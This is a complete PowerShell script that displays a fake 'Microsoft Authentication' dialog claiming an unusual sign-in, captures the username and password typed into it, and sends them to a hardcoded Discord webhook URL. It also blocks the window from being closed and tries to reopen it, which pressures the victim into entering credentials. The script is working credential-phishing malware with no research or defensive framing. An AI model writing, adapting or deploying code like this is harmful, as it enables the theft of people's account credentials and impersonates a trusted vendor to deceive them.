Add-Type -AssemblyName System.Windows.Forms

# Use the same Discord webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1299731417290375279/pfX2RVqzHPbZDbdw97pCiSZ9keXRQlRyEul7Wbisgvjw9pbbpLEyr_ZAIXTEQ-VUhbUP"

# Function to send credentials to Discord
function Send-Credentials {
    param (
        [string]$username,
        [string]$password
    )
    # Prepare JSON payload for Discord
    $body = @{
        'content' = "Captured Credentials:`n**Username:** $username`n**Password:** $password"
    } | ConvertTo-Json -Depth 10

    # Send the credentials to Discord webhook
    Invoke-RestMethod -Uri $webhookUrl -Method POST -ContentType 'application/json' -Body $body
}

# Function to display the fake login form
function Show-FakeLogin {
    # Create the form
    $form = New-Object System.Windows.Forms.Form
    $form.Text = "Microsoft Authentication"
    $form.Size = New-Object System.Drawing.Size(400, 200)
    $form.StartPosition = "CenterScreen"
    $form.TopMost = $true
    $form.FormBorderStyle = "FixedDialog"
    $form.MaximizeBox = $false
    $form.MinimizeBox = $false

    # Add a label
    $label = New-Object System.Windows.Forms.Label
    $label.Text = "Unusual sign-in detected. Please authenticate your Microsoft account."
    $label.AutoSize = $true
    $label.Location = New-Object System.Drawing.Point(10, 10)
    $form.Controls.Add($label)

    # Username textbox
    $usernameBox = New-Object System.Windows.Forms.TextBox
    $usernameBox.PlaceholderText = "Username"
    $usernameBox.Location = New-Object System.Drawing.Point(10, 50)
    $usernameBox.Width = 360
    $form.Controls.Add($usernameBox)

    # Password textbox
    $passwordBox = New-Object System.Windows.Forms.TextBox
    $passwordBox.PlaceholderText = "Password"
    $passwordBox.Location = New-Object System.Drawing.Point(10, 90)
    $passwordBox.Width = 360
    $passwordBox.UseSystemPasswordChar = $true
    $form.Controls.Add($passwordBox)

    # OK button
    $okButton = New-Object System.Windows.Forms.Button
    $okButton.Text = "OK"
    $okButton.Location = New-Object System.Drawing.Point(200, 130)
    $okButton.Add_Click({
        if ($passwordBox.Text -ne "") {
            # Send credentials to Discord
            Send-Credentials $usernameBox.Text $passwordBox.Text
            $form.Close()
        }
        else {
            [System.Windows.Forms.MessageBox]::Show("Password cannot be empty.")
        }
    })
    $form.Controls.Add($okButton)

    # Prevent closing the form
    $form.FormClosing.Add({
        $_.Cancel = $true
    })

    # Detect mouse movement to reopen the form if closed or minimized
    $form.Add_Shown({
        $global:FormOpen = $true
        Register-ObjectEvent -InputObject [System.Windows.Forms.Control]::FromHandle((Get-Process -Id $pid).MainWindowHandle) -EventName MouseMove -Action {
            if (-not $global:FormOpen) {
                Show-FakeLogin
            }
        }
    })

    # Display the form
    $form.ShowDialog()
}

# Start the fake login popup
Show-FakeLogin